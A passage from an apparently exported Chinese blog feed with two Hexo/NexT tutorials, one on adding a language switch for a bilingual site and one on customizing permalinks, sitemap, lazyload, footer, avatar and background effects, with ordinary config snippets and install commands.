&#123;post: post, is_index: true&#125;) &#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">      </span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-tag">&#123;%- <span class="name"><span class="name">endfor</span></span> %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">  </span><span class="template-tag">&#123;% <span class="name"><span class="name">include</span></span> &#x27;_partials/pagination.swig&#x27; %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;% <span class="name"><span class="name">endblock</span></span> %&#125;</span></span><br></pre></td></tr></table></figure>

<p>再加入该语句之后，只有当页面的语言与文章的语言完全一致时，这篇文章才会被生成。此时再打开首页观察一下，所有的文章都已经根据语言分类到对应的页面中了。</p>
<p>同理，如果站点启用了其他导航页面，你希望在这些页面中，显示的文章同样也根据当前页面的语言来显示的话。那就对其相对应的生成页面做相同的改动就可以了。如，我希望更改归档页面，那就找到themes&#x2F;next&#x2F;layout&#x2F;archive.swig, 并为</p>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123; <span class="name"><span class="built_in">partial</span></span>(<span class="name">&#x27;_macro/post.swig&#x27;</span>, &#123;post: post, is_index: <span class="literal">true</span>&#125;) &#125;&#125;</span></span><br></pre></td></tr></table></figure>
<p>添加判断条件。</p>
<p>但是，这也还没有结束。虽然我们已经有两个基本符合我们想象的中英文页面，但他们却还互不相通。因此，我们还需要在导航栏中创建一个链接来实现中英文页面之间的跳转。</p>
<h2 id="在目录栏中添加切换语言项"><a href="#在目录栏中添加切换语言项" class="headerlink" title="在目录栏中添加切换语言项"></a>在目录栏中添加切换语言项</h2><p>首先，找到&#x2F;themes&#x2F;next&#x2F;_config.yml文件，在<code>Menu:</code>下添加<code>switch_lang:</code>关键词：</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">menu:</span></span><br><span class="line"><span class="symbol">  home:</span> / || home</span><br><span class="line">  <span class="meta">#about: /about/ || user</span></span><br><span class="line">  <span class="meta">#tags: /tags/ || tags</span></span><br><span class="line"><span class="symbol">  categories:</span> <span class="keyword">/categories/</span> || th</span><br><span class="line"><span class="symbol">  archives:</span> <span class="keyword">/archives/</span> || archive</span><br><span class="line">  <span class="meta">#schedule: /schedule/ || calendar</span></span><br><span class="line">  <span class="meta">#sitemap: /sitemap.xml || sitemap</span></span><br><span class="line">  <span class="meta">#commonweal: /404/ || heartbeat</span></span><br><span class="line"><span class="symbol">  switch_lang:</span> /en || language</span><br></pre></td></tr></table></figure>

<p>其中，<code>||</code>之后的值为该链接所使用的FontAwesome Icon的标签名，有需要的话可以自行修改。不过话说回来，我觉得主题默认的图标都还是不错的，没什么必要修改。如果<code>||</code>之后没有填写，则会显示问号图标。</p>
<p>然后，再为NexT的语言支持文件添加对应的翻译。这里的例子中需要修改的是&#x2F;themes&#x2F;next&#x2F;languages&#x2F;下的zh-CN.yml和en.yml文件。在两个文件中分别添加<code>switch_lang:</code>：</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">menu:</span></span><br><span class="line"><span class="symbol">  home:</span> 首页</span><br><span class="line"><span class="symbol">  archives:</span> 归档</span><br><span class="line"><span class="symbol">  categories:</span> 分类</span><br><span class="line"><span class="symbol">  tags:</span> 标签</span><br><span class="line"><span class="symbol">  about:</span> 关于</span><br><span class="line"><span class="symbol">  search:</span> 搜索</span><br><span class="line"><span class="symbol">  schedule:</span> 日程表</span><br><span class="line"><span class="symbol">  sitemap:</span> 站点地图</span><br><span class="line"><span class="symbol">  commonweal:</span> 公益 <span class="number">404</span></span><br><span class="line"><span class="symbol">  switch_lang:</span> --&gt;English</span><br></pre></td></tr></table></figure>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">menu:</span></span><br><span class="line"><span class="symbol">  home:</span> Home</span><br><span class="line"><span class="symbol">  archives:</span> Archives</span><br><span class="line"><span class="symbol">  categories:</span> Categories</span><br><span class="line"><span class="symbol">  tags:</span> Tags</span><br><span class="line"><span class="symbol">  about:</span> About</span><br><span class="line"><span class="symbol">  search:</span> Search</span><br><span class="line"><span class="symbol">  schedule:</span> Schedule</span><br><span class="line"><span class="symbol">  sitemap:</span> Sitemap</span><br><span class="line"><span class="symbol">  commonweal:</span> Commonweal <span class="number">404</span></span><br><span class="line"><span class="symbol">  switch_lang:</span> --&gt;简体中文</span><br></pre></td></tr></table></figure>

<p>细心的话可能已经会发现，之前在Next主题的_config.yml文件中添加的<code>switch_lang:</code>项所对应的链接为&#x2F;en。这就意味着，如果我们正在浏览英文页面，虽然目录栏中会显示<code>--&gt;简体中文</code>的语言切换栏，但是点击的话则依旧会跳转到&#x2F;en页面。也就是说，目前这个跳转链接还只是单向可用的！所以我们还需要一步额外的操作，使英文页面在生成时将这个链接更改为指向我们的主页面（中文首页）。</p>
<p><del>在themes&#x2F;next&#x2F;layout&#x2F;_custom&#x2F;head.swig中<strong>添加下列js代码</strong>，使其在加载完英文页面后，将switch_lang所对应的链接地址替换。</del><br>在<code>source/_data</code>目录下新建head.swig文件，并<strong>添加下列js代码</strong>。<br>同时在主题配置文件中找到<code>custom_file_path</code>，将head所在行的注释去除。这样，我们的博客在加载完英文页面后，就可以自动将switch_lang所对应的链接地址替换。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Wait for the page to load first</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> _prevOnload = <span class="variable language_">window</span>.<span class="property">onload</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> switchLang = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;menu&quot;</span>).<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;menu-item-switch_lang&quot;</span>)[<span class="number">0</span>].<span class="property">childNodes</span>[<span class="number">1</span>];</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> href = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> indexOfEn = href.<span class="title function_">toLowerCase</span>().<span class="title function_">indexOf</span>(<span class="string">&#x27;/en/&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span>(indexOfEn !== -<span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                switchLang.<span class="property">href</span> = href.<span class="title function_">replace</span>(<span class="string">&#x27;/en/&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                switchLang.<span class="property">href</span> = href.<span class="title function_">replace</span>(<span class="regexp">/(^http[s]?:\/\/[a-z0-9.]*[:?0-9]*\/)(.*)/i</span>, <span class="string">&#x27;$1en/$2&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><em>这段代码还有改进的空间。如果有合适的意见请在评论中指出。</em></p>
<p>好了！终于来到最后一步了：<code>hexo clean &amp;&amp; hexo g &amp;&amp; hexo d </code>重新生成并部署。现在应该就能看到一个相对比较理想的中英文双语博客了。</p>
<h1 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h1><p>当然，通过这种方法实现的Hexo双语网站也还远远没有完善。还有非常多待改进的地方：</p>
<ul>
<li>文章页面跳转<br>  暂时全部跳转到首页</li>
<li>分类中全部显示<br>  在分类生成时加入相应的判断语句</li>
<li>所有文章都会被分别加入两个文件夹，导致数量不对<br>  直接调用Hexo中的函数，不好改。有兴趣的话可以重写。</li>
</ul>
<hr>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://wm4n.github.io/Hexo-NexT-%E5%90%8C%E6%99%82%E6%94%AF%E6%8F%B4%E5%A4%9A%E8%AA%9E%E7%B3%BB/">https://wm4n.github.io/Hexo-NexT-%E5%90%8C%E6%99%82%E6%94%AF%E6%8F%B4%E5%A4%9A%E8%AA%9E%E7%B3%BB/</a></p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>NexT</tag>
        <tag>Configuration</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo + NexT 深度个性化配置 (2020.1 更新)</title>
    <url>/zh-CN/44bf8def/</url>
    <content><![CDATA[<h1 id="2020-11-更新"><a href="#2020-11-更新" class="headerlink" title="2020.11 更新"></a>2020.11 更新</h1><p>升级版本至 Hexo v5.2.0, Next v8.0.2。部分操作产生变化，已更新。</p>
<hr>
<h1 id="2020-1-更新"><a href="#2020-1-更新" class="headerlink" title="2020.1 更新"></a>2020.1 更新</h1><p><strong>所有操作均在Hexo v4.2.0, NexT v7.7.0 版本上验证。如有版本变化，请根据实际情况对部分步骤进行相应修改</strong></p>
<hr>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近重新拾起博客，更新，域名迁移，重新配置，优化。这一套下来我真的，脑阔都大了！！<br>于是非常自觉的弹出了这么一个想法，我在这个过程中所有的操作都记录下来。一来，方便未来知道自己究竟改过些什么，其次，也可以给他人一个参考。有些前人已经踩进去过的泥潭就没有必要再去踩一遍啦！！  </p>
<p>由于Hexo和NexT的更新还是比较频繁的，变化的幅度也相当大。所以文章的内容可能不经意间就out了。其实，归根结底，所有的博客只能是作为一个引导，具体的操作永远会因为各种各样的原因而不能照搬。希望大家可以先仔细阅读官方的文档，这样可以对Hexo+NexT有更深的理解。Hexo的官方文档相对而言比较残旧，直接完全按照官方文档来做是会遇到一头包的。NexT的官方文档相对好很多，但需要跟上更新速度。  </p>
<span id="more"></span>

<h1 id="Hexo-和-NexT本地安装"><a href="#Hexo-和-NexT本地安装" class="headerlink" title="Hexo 和 NexT本地安装"></a>Hexo 和 NexT本地安装</h1><p>这部分网上教程茫茫多。所以懒得写了。。。哈哈！没想到吧！<br>大多数情况跟着官方文档直接操作即可。nodeJS跟npm的安装有时会比较tricky。</p>
<h1 id="站点配置"><a href="#站点配置" class="headerlink" title="站点配置"></a>站点配置</h1><p>对于站点配置，我们大多对<code>[站点主目录]/_config.yml</code>文件进行修改。</p>
<h2 id="Github-Pages部署自定义域名"><a href="#Github-Pages部署自定义域名" class="headerlink" title="Github Pages部署自定义域名"></a>Github Pages部署自定义域名</h2><p>我图省事儿，就直接将博客部署在Github Pages上。同时，我又正好有一个自己的域名，所以就想要使用自己的域名。有办法吗？？？当然！<br>现在Github Pages对于自定义域名有很好的支持，并且支持HTTPS。具体操作参见<a href="https://io-oi.me/tech/custom-domains-on-github-pages">这篇教程</a>。<br>很清楚，照做就好了。  </p>
<blockquote>
<p>如果之前对域名使用过其他的CDN服务，请先取消CDN服务。否则，你使用HTTPS访问自己的域名时，浏览器左侧的小锁会没法锁上！</p>
</blockquote>
<h2 id="修改文章永久链接"><a href="#修改文章永久链接" class="headerlink" title="修改文章永久链接"></a>修改文章永久链接</h2><p>默认的永久链接格式是<code>/year/month/day/title/</code>这样的形式。感觉有些冗余，也不美观。所以我对其进行修改：<br>在主题配置文件中搜索**permalink:**，并对其进行配置。以下是我使用的配置，仅供参考：<br>(这里使用到了<code>hexo-abbrlink</code>这个插件，需要通过<code>npm install hexo-abbrlink --save</code>安装。)  </p>
<figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line"># URL</span><br><span class="line">## <span class="keyword">If</span> your site <span class="keyword">is</span> put <span class="keyword">in</span> a subdirectory, <span class="keyword">set</span> url <span class="keyword">as</span> <span class="string">&#x27;http://yoursite.com/child&#x27;</span> <span class="keyword">and</span> root <span class="keyword">as</span> <span class="string">&#x27;/child/&#x27;</span></span><br><span class="line">url: https:<span class="comment">//upwnothing.github.io</span></span><br><span class="line">root: /</span><br><span class="line">permalink: :lang/:abbrlink/</span><br><span class="line">abbrlink: </span><br><span class="line">  alg: crc32 #算法：crc16(<span class="keyword">default</span>), crc32</span><br><span class="line">  rep: hex   #进制：dec(<span class="keyword">default</span>), hex</span><br><span class="line">permalink_defaults:</span><br><span class="line">pretty_urls:</span><br><span class="line">  trailing_index: <span class="keyword">true</span> # <span class="keyword">Set</span> <span class="keyword">to</span> <span class="keyword">false</span> <span class="keyword">to</span> <span class="keyword">remove</span> trailing <span class="string">&#x27;index.html&#x27;</span> <span class="keyword">from</span> permalinks</span><br><span class="line">  trailing_html: <span class="keyword">true</span> # <span class="keyword">Set</span> <span class="keyword">to</span> <span class="keyword">false</span> <span class="keyword">to</span> <span class="keyword">remove</span> trailing <span class="string">&#x27;.html&#x27;</span> <span class="keyword">from</span> permalinks</span><br></pre></td></tr></table></figure>

<h2 id="双语博客配置"><a href="#双语博客配置" class="headerlink" title="双语博客配置"></a>双语博客配置</h2><p>详见<a href="https://upwnothing.github.io/zh-CN/78ced6ec/">利用Hexo框架搭建中英文双语网站</a></p>
<h2 id="添加About页面"><a href="#添加About页面" class="headerlink" title="添加About页面"></a>添加About页面</h2><p>待完善</p>
<h2 id="添加个性化404页面"><a href="#添加个性化404页面" class="headerlink" title="添加个性化404页面"></a>添加个性化404页面</h2><p>其实如果像我一样在Github Page上部署网页，Github有提供统一的404页面。当然，如果希望可以对404页面进行个性化改造，那么就需要稍许折腾一番。<br>一种是直接在<code>source</code>目录下创建一个<code>404.html</code>文件，并将你想要的样式以及HTML源码都添加到这个文件中。同时在站点配置文件<code>_config.yml</code>中，配置<code>skip_render</code>:</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="meta"># Directory</span></span><br><span class="line"><span class="symbol">source_dir:</span> source</span><br><span class="line"><span class="symbol">public_dir:</span> public</span><br><span class="line"><span class="symbol">tag_dir:</span> tags</span><br><span class="line"><span class="symbol">archive_dir:</span> archives</span><br><span class="line"><span class="symbol">category_dir:</span> categories</span><br><span class="line"><span class="symbol">code_dir:</span> downloads/code</span><br><span class="line"><span class="symbol">i18n_dir:</span> :lang</span><br><span class="line"><span class="symbol">skip_render:</span></span><br><span class="line">  - <span class="string">&quot;404.html&quot;</span></span><br></pre></td></tr></table></figure>

<p>也可以通过<code>hexo new page 404</code>来创建一个与博客整体风格一致的404页面，然后编辑<code>source/404/index.md</code>。网上很容易搜到有许多使用腾讯公益的404页面源码。</p>
<h2 id="添加Sitemap"><a href="#添加Sitemap" class="headerlink" title="添加Sitemap"></a>添加Sitemap</h2><p>为自己的网站配置sitemap，可以有效地提升SEO。具体方法如下：</p>
<p>安装<code>hexo-generator-sitemap</code>和<code>hexo-generator-baidu-sitemap</code>。  </p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">npm <span class="keyword">install </span>hexo-generator-sitemap --save</span><br><span class="line">npm <span class="keyword">install </span>hexo-generator-<span class="keyword">baidu-sitemap </span>--save</span><br></pre></td></tr></table></figure>

<p>并在站点配置文件<code>_config.yml</code>的末尾添加：  </p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">sitemap:</span></span><br><span class="line"><span class="symbol">  path:</span> sitemap.xml</span><br><span class="line"><span class="symbol">baidusitemap:</span></span><br><span class="line"><span class="symbol">  path:</span> baidusitemap.xml</span><br></pre></td></tr></table></figure>


<h2 id="图片懒加载配置"><a href="#图片懒加载配置" class="headerlink" title="图片懒加载配置"></a>图片懒加载配置</h2><p><strong>注意！！不推荐在站点配置中设置图片懒加载。该功能其实已经集成在NexT主题中，如何启用详见:</strong><a href="##%E5%90%AF%E7%94%A8Lazyload%E5%9B%BE%E7%89%87%E6%87%92%E5%8A%A0%E8%BD%BD">在NexT中启用Lazyload</a></p>
<p>前面提到过，由于网站是搭建在Github Pages上，服务器不在国内，所以对于一些图片很多的文章，文章加载会非常慢。为了解决这个问题，我们可以启用图片懒加载功能。  </p>
<p>图片懒加载可以有效地提升网站性能和用户体验。其原理是仅先加载用户可见部分的图片，其余的都暂时先不加载。  </p>
<p>首先安装<code>hexo-lazyload-image</code>插件：</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">npm install hexo-lazyload-<span class="built_in">image</span> --<span class="built_in">save</span></span><br></pre></td></tr></table></figure>

<p>再在站点配置文件<code>_config.yml</code>中添加上下列内容：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Lazyload Image</span></span><br><span class="line"><span class="comment">## npm install hexo-lazyload-image --save</span></span><br><span class="line"><span class="attr">lazyload:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">onlypost:</span> <span class="literal">false</span>  <span class="comment"># 设置为true，那么只有page和post页面中的图片会使用LazyLoad</span></span><br><span class="line">  <span class="attr">loadingImg:</span> <span class="comment"># /images/loading.gif    # 默认为空，加上图片地址可以自定义加载时显示的图片</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>使用<code>Hexo-lazyload-image</code>方法启用图片懒加载时，如果同时也启用了Fancybox拓展，那么可能会造成冲突。<br>而使用NexT集成的Lazyload库则不会与Fancybox产生冲突。缺点则是，NexT主题中的Lazyload无法配置onlypost与loadingImg。</p>
</blockquote>
<h1 id="主题配置"><a href="#主题配置" class="headerlink" title="主题配置"></a>主题配置</h1><p>默认的NexT主题配置文件为：<code>blog/themes/next/_config.yml</code>。<br><strong>但是</strong>,！目前NexT的更新都是通过git pull的方式来获取的，每次更新需要花费很大的精力来解决冲突。<br>这显然不是一种科学的方法。对此，官方提出的<a href="https://github.com/theme-next/hexo-theme-next/blob/master/docs/zh-CN/DATA-FILES.md">解决方法</a>为:  </p>
<ol>
<li>不需要修改<code>blog/themes/next/_config.yml</code>，而是将全部主题配置都置于Hexo站点配置文件<code>blog/_config.yml</code>下。所有的主题配置都放置在<code>theme_config:</code>后，并缩进两个空格。</li>
<li>不需要修改<code>blog/themes/next/_config.yml</code>，而是将全部主题配置都置于<code>blog/themes/_data/next.yml</code>下。</li>
</ol>
<p>具体的使用方法官方文档写得非常明确了。我这边选择的是第一种方法。<br>所以，对于需要修改的配置项，我们要做的是：</p>
<ol>
<li>在<code>blog/themes/next/_config.yml</code>中找到相关配置，并复制。</li>
<li>粘帖到<code>blog/_config.yml</code>中的<code>theme_config:</code>下方，并调整缩进为两个空格。</li>
<li>在<code>blog/_config.yml</code>中修改对应的配置项。</li>
</ol>
<p>这些步骤我在下文都会用”修改主题配置文件“代替。请务必先理解这句话对应的操作是这三步。 </p>
<blockquote>
<p>Hexo 5.0 开始，又有另一种主题配置文件的设置方法被采用。<a href="https://hexo.io/docs/configuration.html#Using-an-Alternate-Config">^1</a> 可以在站点根目录中存放一个<code>_config.[theme].yml</code>的配置文件，用来取代原来主题目录下的<code>_config.yml</code>文件。<br>优先级最高的为主目录<code>_config.yml</code>文件中，<code>theme_config</code>下的配置信息。上面所说的<code>_config.[theme].yml</code>其次，主题目录下的配置文件优先级最低。</p>
</blockquote>
<h2 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h2><p>一些一看就懂的配置项，在这里一笔带过。</p>
<h4 id="网站图标"><a href="#网站图标" class="headerlink" title="网站图标"></a>网站图标</h4><p>在主题配置文件中将对应项的值修改为图片路径即可。</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">favicon:</span><br><span class="line">  small: <span class="regexp">/images/</span>favicon-<span class="number">16</span>x16-<span class="keyword">next</span>.png</span><br><span class="line">  medium: <span class="regexp">/images/</span>favicon-<span class="number">32</span>x32-<span class="keyword">next</span>.png</span><br><span class="line">  apple_touch_icon: <span class="regexp">/images/</span>apple-touch-icon-<span class="keyword">next</span>.png</span><br><span class="line">  safari_pinned_tab: <span class="regexp">/images/</span>logo.svg</span><br><span class="line">  #android_manifest: <span class="regexp">/images/m</span>anifest.json</span><br><span class="line">  #ms_browserconfig: <span class="regexp">/images/</span>browserconfig.xml</span><br></pre></td></tr></table></figure>

<ul>
<li>favicon效果<br><img data-src="favicon.png" alt="favicon效果"></li>
</ul>
<h4 id="网站页脚配置"><a href="#网站页脚配置" class="headerlink" title="网站页脚配置"></a>网站页脚配置</h4><p><code>since:</code>设置后，页脚会显示为[开始年份] - [当前年份]。保持默认配置不变则仅显示当前年份。  </p>
<p><code>icon</code>默认是<code>user</code>小人。官方推荐使用红心(heart)，可以在<a href="https://fontawesome.com/v4.7.0/icons">fontawesome</a>中找自己喜欢的替换即可。我使用了小爪子，<code>animated</code>设置为<code>true</code>可以开启动画效果。也可以自己设置颜色。</p>
<p><code>powered:</code>和<code>theme</code>配置项则用来配置是否在页脚显示Hexo和NexT的名字以及版本号。</p>
<p><code>Beian</code>可以用来显示网站的公安备案信息。我这边没有这个需求。</p>
<ul>
<li>页脚效果<br><img data-src="footer.png" alt="页脚效果"></li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">footer:</span></span><br><span class="line">  <span class="comment"># Specify the date when the site was setup. If not defined, current year will be used.</span></span><br><span class="line">  <span class="attr">since:</span> <span class="number">2017</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Icon between year and copyright info.</span></span><br><span class="line">  <span class="attr">icon:</span></span><br><span class="line">    <span class="comment"># Icon name in Font Awesome. See: https://fontawesome.com/v4.7.0/icons/</span></span><br><span class="line">    <span class="comment"># `heart` is recommended with animation in red (#ff0000).</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">paw</span></span><br><span class="line">    <span class="comment"># If you want to animate the icon, set it to true.</span></span><br><span class="line">    <span class="attr">animated:</span> <span class="literal">true</span></span><br><span class="line">    <span class="comment"># Change the color of icon, using Hex Code.</span></span><br><span class="line">    <span class="attr">color:</span> <span class="string">&quot;#808080&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># If not defined, `author` from Hexo `_config.yml` will be used.</span></span><br><span class="line">  <span class="attr">copyright:</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">powered:</span></span><br><span class="line">    <span class="comment"># Hexo link (Powered by Hexo).</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="comment"># Version info of Hexo after Hexo link (vX.X.X).</span></span><br><span class="line">    <span class="attr">version:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">theme:</span></span><br><span class="line">    <span class="comment"># Theme &amp; scheme info link (Theme - NexT.scheme).</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="comment"># Version info of NexT after scheme info (vX.X.X).</span></span><br><span class="line">    <span class="attr">version:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Beian ICP and gongan information for Chinese users. See: http://www.beian.miit.gov.cn, http://www.beian.gov.cn</span></span><br><span class="line">  <span class="attr">beian:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">icp:</span></span><br><span class="line">    <span class="comment"># The digit in the num of gongan beian.</span></span><br><span class="line">    <span class="attr">gongan_id:</span></span><br><span class="line">    <span class="comment"># The full num of gongan beian.</span></span><br><span class="line">    <span class="attr">gongan_num:</span></span><br><span class="line">    <span class="comment"># The icon for gongan beian. See: http://www.beian.gov.cn/portal/download</span></span><br><span class="line">    <span class="attr">gongan_icon_url:</span></span><br></pre></td></tr></table></figure>

<h4 id="侧边栏头像配置"><a href="#侧边栏头像配置" class="headerlink" title="侧边栏头像配置"></a>侧边栏头像配置</h4><p>在主题配置文件中修改如下：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Sidebar Avatar</span></span><br><span class="line"><span class="attr">avatar:</span></span><br><span class="line">  <span class="comment"># Replace the default image and set the url here.</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">/images/icon.jpeg</span></span><br><span class="line">  <span class="comment"># If true, the avatar will be dispalyed in circle.</span></span><br><span class="line">  <span class="attr">rounded:</span> <span class="literal">true</span>      <span class="comment"># 头像显示为圆形</span></span><br><span class="line">  <span class="comment"># If true, the avatar will be rotated with the cursor.</span></span><br><span class="line">  <span class="attr">rotated:</span> <span class="literal">true</span>       <span class="comment"># 设置为true时，鼠标移动到头像上时头像会旋转一圈</span></span><br></pre></td></tr></table></figure>

<ul>
<li>侧边栏头像效果<br><img data-src="avatar.png" alt="侧边栏头像效果"></li>
</ul>
<h2 id="添加背景动态效果"><a href="#添加背景动态效果" class="headerlink" title="添加背景动态效果"></a>添加背景动态效果</h2><h3 id="Canvas-nest安装配置"><a href="#Canvas-nest安装配置" class="headerlink" title="Canvas-nest安装配置"></a>Canvas-nest安装配置</h3><p>进入<code>themes/next</code>目录,执行命令：  </p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/theme-next/</span>theme-<span class="keyword">next</span>-canvas-nest source<span class="regexp">/lib/</span>canvas-nest </span><br></pre></td></tr></table></figure>

<p>其实就是下载canvas-next动态效果的js文件，并添加到<code>source/lib</code>目录下。</p>
<p>在_config.yml中，在<code>theme_config:</code>下添加: </p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">canvas_nest:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> </span><br><span class="line">  <span class="attr">onmobile:</span> <span class="literal">true</span> <span class="comment"># Display on mobile or not</span></span><br><span class="line">  <span class="attr">color:</span> <span class="string">&quot;0,0,255&quot;</span> <span class="comment"># RGB values, use `,` to separate</span></span><br><span class="line">  <span class="attr">opacity:</span> <span class="number">0.5</span> <span class="comment"># The opacity of line: 0~1</span></span><br><span class="line">  <span class="attr">zIndex:</span> <span class="number">-1</span> <span class="comment"># z-index property of the background</span></span><br><span class="line">  <span class="attr">count:</span> <span class="number">99</span> <span class="comment"># The number of lines</span></span><br></pre></td></tr></table></figure>

<p><code>enable</code>后面5行可以根据自己的需要进行修改。如果认为默认的参数都不错的话，那么就可以直接省略这几行。</p>
<blockquote>
<p>Next 8.0.2 之后，Canvas_nest不再被原生支持。所以需要在<code>hexo/source/_data/</code>下创建<code>footer.njk</code>文件<br>在文件中添加<code>&lt;script color=&quot;0,0,255&quot; opacity=&quot;0.5&quot; zIndex=&quot;-1&quot; count=&quot;99&quot; src=&quot;https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js&quot;&gt;&lt;/script&gt;</code>，并将其中的参数修改为自己想要的值。<br>最后再在主题配置文件中，修改<code>custom_file_path</code>，将<code>footer: source/_data/footer.njk</code>的注释删除即可。</p>
</blockquote>
<h2 id="添加相关文章推荐功能"><a href="#添加相关文章推荐功能" class="headerlink" title="添加相关文章推荐功能"></a>添加相关文章推荐功能</h2><p>该功能需要安装依赖的插件<a href="https://github.com/tea3/hexo-related-popular-posts">Hexo-Related-Popular-Posts</a>：  </p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">npm install hexo-related-popular-posts <span class="comment">--save</span></span><br></pre></td></tr></table></figure>

<p>再在<code>_config.yml</code>中对主题进行配置：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">related_posts:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Custom header, leave empty to use the default one 设置推荐区块的标题</span></span><br><span class="line">  <span class="attr">title:</span>     </span><br><span class="line">  <span class="attr">display_in_home:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">params:</span></span><br><span class="line">    <span class="attr">maxCount:</span> <span class="number">5</span></span><br><span class="line">    <span class="comment">#PPMixingRate: 0.0</span></span><br><span class="line">    <span class="comment">#isDate: false</span></span><br><span class="line">    <span class="comment">#isImage: false</span></span><br><span class="line">    <span class="comment">#isExcerpt: false</span></span><br></pre></td></tr></table></figure>
<h2 id="启用Hexo-NexT本地搜索"><a href="#启用Hexo-NexT本地搜索" class="headerlink" title="启用Hexo NexT本地搜索"></a>启用Hexo NexT本地搜索</h2><p>NexT主题中，搜索功能支持多种搜索服务，其中最常用的是本地搜索和Algolia搜索两种。  </p>
<ul>
<li>Algolia搜索借助Algolia提供的SaaS搜索服务，实现文档的搜索功能。  </li>
<li>本地搜索通过<code>hexo-generator-searchdb</code>插件，在本地生成search.xml。该文件作为一个小型的数据库，配合js脚本实现了本地搜索的功能。</li>
</ul>
<p>首先，安装插件：  </p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb <span class="comment">--save</span></span><br></pre></td></tr></table></figure>
<p>再修改配置文件<code>_config.yml</code>，启用本地搜索功能：  </p>
